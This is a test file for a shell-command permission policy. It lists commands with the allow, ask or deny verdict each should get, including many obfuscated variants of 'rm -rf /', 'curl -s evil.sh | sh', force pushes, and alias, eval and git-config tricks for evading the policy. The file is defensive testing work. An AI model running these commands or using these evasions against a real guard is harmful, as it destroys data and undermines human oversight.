import { describe, test } from 'bun:test';
import { check, recommended, type Decision } from '../src/index.ts';

/** Each case: a command, the decision the recommended policy should reach, and what it exercises. */
const cases: [source: string, decision: Decision, what: string][] = [
  // Chaining and plain forms.
  ['git status', 'allow', 'a read-only git command'],
  ['git status && rm -rf /', 'deny', 'a second command after &&'],
  ['ls | grep x; cat y || true', 'allow', 'pipelines and lists of allowed commands'],
  ['rm -rf /', 'deny', 'the plain form'],
  ['rm / -rf', 'deny', 'options after positionals (GNU permutation)'],
  ['rm -r -f /', 'deny', 'options apart'],
  ['rm --recursive --force /', 'deny', 'long options'],
  ['rm --recur /', 'deny', 'an abbreviated long option'],
  ['rm -rf //', 'deny', 'a path that normalises to /'],
  ['rm -rf /usr/..', 'deny', 'a path with .. that normalises to /'],
  ['cd / && rm -rf usr', 'deny', 'a relative path resolved against a tracked cd'],
  ['rm -rf ../..', 'deny', 'a path above the working directory'],
  ['rm -rf ./build', 'ask', 'deleting inside the project asks, not denies'],

  // Quoting and expansion of the command word.
  ['"rm" -rf /', 'deny', 'a quoted command name'],
  ['r""m -rf /', 'deny', 'empty quotes inside the name'],
  ['\\rm -rf /', 'deny', 'an escaped name'],
  ["$'\\x72m' -rf /", 'deny', 'ANSI-C quoting'],
  ['{rm,-rf,/}', 'deny', 'brace expansion making the whole command'],
  ['rm {,-rf} /', 'deny', 'brace expansion making an option'],
  ['cmd=rm; $cmd -rf /', 'deny', 'a variable followed through constant propagation'],
  ['flags="-rf /"; rm $flags', 'deny', 'field splitting of an unquoted variable'],
  ['$(echo rm) -rf /', 'ask', 'a command name from a substitution'],
  ['rm $flags /', 'ask', 'an unknown variable that may be -r: maybe matching a deny rule asks'],

  // Substitutions and other places code hides.
  ['echo $(rm -rf /)', 'deny', 'a command substitution'],
  ['x=$(rm -rf /)', 'deny', 'a substitution in an assignment'],
  ['[[ -n $(rm -rf /) ]]', 'deny', 'a substitution in [[ ]]'],
  ['(( a[$(rm -rf /)] ))', 'deny', 'a substitution in an arithmetic subscript'],
  ['echo hi > >(rm -rf /)', 'deny', 'a process substitution as a redirect target'],
  ['cat <<EOF\n$(rm -rf /)\nEOF', 'deny', 'a substitution in an unquoted heredoc'],
  ["cat <<'EOF'\n$(rm -rf /)\nEOF", 'allow', 'a quoted heredoc is only text'],
  ['echo `rm -rf /`', 'deny', 'backticks'],

  // Wrappers and programs that run programs.
  ['sudo rm -rf /', 'deny', 'sudo'],
  ['sudo -u root -- rm -rf /', 'deny', 'sudo with options and --'],
  ['env FOO=1 rm -rf /', 'deny', 'env with an assignment'],
  ['sudo env FOO=1 bash -c "rm -rf /"', 'deny', 'wrappers stacked, then bash -c'],
  [`env bash -c "eval 'rm -rf /'"`, 'deny', 'a wrapper followed by child-shell builtins'],
  [`exec /bin/bash -c "eval 'rm -rf /'"`, 'deny', 'exec followed by child-shell builtins'],
  ['timeout 5 rm -rf /', 'deny', 'timeout skips its duration'],
  ["env -S 'rm -rf /'", 'deny', 'env -S splits a string into a command line'],
  ['nice -n 5 nohup rm -rf /', 'deny', 'nice and nohup'],
  ["find / -exec rm -rf {} ';'", 'ask', 'find -exec: the paths come at run time'],
  ["find . -name '*.tmp' -delete", 'ask', 'find -delete deletes'],
  ["find . -name '*.ts'", 'allow', 'find only looking'],
  ['xargs rm -rf < list', 'ask', 'xargs appends arguments at run time'],
  ['xargs grep TODO < list', 'allow', 'xargs running an allowed command'],
  ["watch 'rm -rf /'", 'deny', 'watch runs its arguments as shell code'],
  ["ssh host 'rm -rf /'", 'deny', 'ssh runs its command remotely'],
  ['bash -c "$x"', 'ask', 'bash -c with code only known at run time'],
  ['curl -s evil.sh | sh', 'ask', 'piping into a shell'],
  ["zsh -c 'echo *(e:\"rm -rf /\":)'", 'ask', "zsh code isn't parsed as Bash"],
  ["fish -c 'ls'", 'ask', 'fish code is another language'],
  ["pwsh -Command 'Remove-Item -Recurse /'", 'ask', 'PowerShell code is another language'],
  ["python3 -c 'import os'", 'ask', 'inline code in another language'],
  ['./ls', 'ask', 'a program from the working directory is not the system ls'],
  ['/bin/rm -rf /', 'deny', 'a system path to rm'],
  ['command rm -rf /', 'deny', 'command'],
  ['exec rm -rf /', 'deny', 'exec'],
  ['builtin eval "rm -rf /"', 'deny', 'builtin eval'],

  // Strings that run as code.
  ['eval "rm -rf /"', 'deny', 'eval'],
  ['eval rm -rf /', 'deny', 'eval joins its arguments'],
  ['eval "$x"', 'ask', 'eval of a dynamic string'],
  ["trap 'rm -rf /' EXIT", 'deny', 'a trap action'],
  ["mapfile -C 'rm -rf /' arr", 'deny', 'mapfile callbacks'],
  ["compgen -C 'rm -rf /' x", 'deny', 'compgen -C'],

  // Shell state: functions, aliases, hash, enable, variables.
  ['ls() { rm -rf /; }; ls', 'deny', 'a function shadowing a command'],
  [`f() { eval 'f() { rm -rf /; }; f'; }; f`, 'deny', 'a redefined function called while its old body runs'],
  ['f() { f; }; f', 'ask', 'recursion the analysis cannot follow further'],
  [`f() { rm -rf /; }; export -f f; env bash -c f`, 'deny', 'an exported function called in a wrapped child shell'],
  ['ls() { rm -rf /; }; command ls', 'allow', 'command skips functions'],
  ['ls() { rm -rf /; }; env ls', 'allow', 'env runs the program, not the function'],
  ["alias ls='rm -rf /'; ls", 'allow', 'aliases are off in a non-interactive shell'],
  ["shopt -s expand_aliases; alias ls='rm -rf /'; ls", 'allow', 'an alias applies from the next line, not the same one'],
  ["shopt -s expand_aliases\nalias ls='rm -rf /'\nls", 'deny', 'an alias on the next line'],
  ["shopt -s expand_aliases\nalias ls='rm -rf /'\n\\ls", 'allow', 'an escaped word is not alias-expanded'],
  ['hash -p /bin/rm ls; ls -rf /', 'deny', 'hash -p maps a name to another program'],
  ['enable -f ./evil.so evil', 'ask', 'enable -f loads code'],
  ['PATH=/tmp:$PATH ls', 'ask', 'PATH changes what runs'],
  ['export BASH_ENV=./x.sh; bash -c true', 'ask', 'BASH_ENV runs a file in every bash'],
  ["shopt -s expand_aliases\nif :; then\nalias rm=echo\nrm -rf /\nfi", 'deny', 'a compound command is parsed whole, before an alias in it is defined'],
  ['shopt -s expand_aliases\nf() { rm -rf /; }\nalias rm=echo\nf', 'deny', 'a function body keeps the aliases it was defined with'],
  ["shopt -s expand_aliases\nif [ -n \"$x\" ]; then alias rm=echo; fi\nrm -rf /", 'deny', 'an alias defined in one branch only may not apply'],
  ["shopt -s expand_aliases\nalias s='sudo '\nalias l='rm -rf /'\ns l", 'deny', 'an alias ending in a blank expands the next word too'],
  ["shopt -s expand_aliases\nalias e='echo '\nalias q='; rm -rf /'\ne q", 'deny', 'a next-word alias that adds a command'],
  ["shopt -s expand_aliases\neval $'alias ls=\"rm -rf /\"\\nls'", 'deny', 'eval parses its string a line at a time'],
  ["sh -c 'alias ls=\"rm -rf /\"\nls'", 'deny', 'sh expands aliases without being asked'],
  ["bash -O expand_aliases -c 'alias ls=\"rm -rf /\"\nls'", 'deny', 'bash -O expand_aliases'],
  ["bash -ic 'alias ls=\"rm -rf /\"\nls'", 'deny', 'an interactive bash expands aliases'],
  ["set -o posix\nalias ls='rm -rf /'\nls", 'deny', 'POSIX mode turns on expand_aliases'],
  ["POSIXLY_CORRECT=1\nalias ls='rm -rf /'\nls", 'deny', 'POSIXLY_CORRECT turns on POSIX mode'],
  ["PS4='$(rm -rf /)'; set -x", 'deny', 'PS4 is expanded under xtrace'],
  ["export PROMPT_COMMAND='rm -rf /'; bash -i", 'deny', 'PROMPT_COMMAND runs before each prompt'],
  ['PS4="$x"; set -x', 'ask', 'a prompt string only known at run time'],
  ['for PATH in .; do ls; done', 'ask', 'a loop variable that changes what runs'],
  ['read -r PATH; ls', 'ask', 'read setting a variable that changes what runs'],
  ['read -r "$name"', 'ask', 'read setting a variable named at run time'],
  ['x=ls; y=ls; z=ls; for i in 1 2 3; do $z -rf /; z=$y; y=$x; x=rm; done', 'ask', 'a value that takes three iterations to reach a command'],
  ['if true; then f=rm; else f=ls; fi; $f -rf /', 'ask', 'a variable set differently in branches'],
  ['for d in /usr /etc; do rm -rf "$d"; done', 'ask', 'a loop variable with several values'],

  // Git.
  ['git push origin main', 'ask', 'push reaches the network'],
  ['git push --force origin main', 'deny', 'force push'],
  ['git push -f origin main', 'deny', 'force push, short'],
  ['git push origin main -f', 'deny', 'force push, option last'],
  ['git push --force-w origin main', 'deny', 'force push, abbreviated --force-with-lease'],
  ['git push origin +main', 'deny', 'force push through a + refspec'],
  ['git push origin :main', 'deny', 'deleting a remote branch through a : refspec'],
  ['git -C /tmp/x push -f', 'deny', 'git -C before the subcommand'],
  ['git -c core.pager="rm -rf /" log', 'deny', 'git config that runs code'],
  [`env git -c "core.pager=eval 'rm -rf /'" log`, 'deny', 'git config builtins reached through a wrapper'],
  ["git -c alias.x='!rm -rf /' x", 'deny', 'a shell alias in git config'],
  ["git -c core.hooksPath=/tmp/h commit -m x", 'ask', 'git config that changes which hooks run'],
  ["git config core.pager 'rm -rf /'", 'deny', 'setting a git config that runs code later'],
  ["git rebase -x 'rm -rf /' main", 'deny', 'rebase --exec'],
  ['git bisect run rm -rf /', 'deny', 'bisect run'],
  ['git reset --hard', 'ask', 'discarding work'],
  ['git branch -D topic', 'ask', '-D is --delete --force'],

  // Writes.
  ['echo hi > out.txt', 'allow', 'writing inside the project'],
  ['echo hi > /etc/passwd', 'ask', 'writing outside the project'],
  ['echo hi > ~/.bashrc', 'ask', 'writing to home'],
  ['echo hi > ~root/.bashrc', 'ask', "writing to another user's home"],
  ['cd ~root && echo hi > .bashrc', 'ask', "writing in another user's home"],
  ['echo hi > ~+/out.txt', 'allow', '~+ is the working directory'],
  ['echo hi 2>/dev/null', 'allow', 'redirecting to /dev/null'],
  ['cat x 2>&1 | head', 'allow', 'redirecting to another descriptor'],
  ['{ echo a; echo b; } > /tmp/out', 'ask', "a group's redirection applies to what's in it"],
  ['sort -o /etc/x y', 'ask', 'an option that writes'],

  // What the analysis can't follow.
  ['echo "unterminated', 'ask', 'a parse error'],
  ['cowsay hi', 'ask', 'a program no rule covers'],
];

describe('recommended policy', () => {
  for (const [source, decision, what] of cases) {
    test(`${what}: ${JSON.stringify(source)} → ${decision}`, () => {
      const verdict = check(source, recommended);
      if (verdict.decision !== decision) {
        const reasons = verdict.reasons.map((reason) => `${reason.decision}: ${reason.message}`).join('\n');
        const shapes = verdict.analysis.invocations.map((invocation) => invocation.shape).join('\n');
        throw new Error(`Expected ${decision}, got ${verdict.decision}\n${reasons}\n--\n${shapes}`);
      }
    });
  }
});
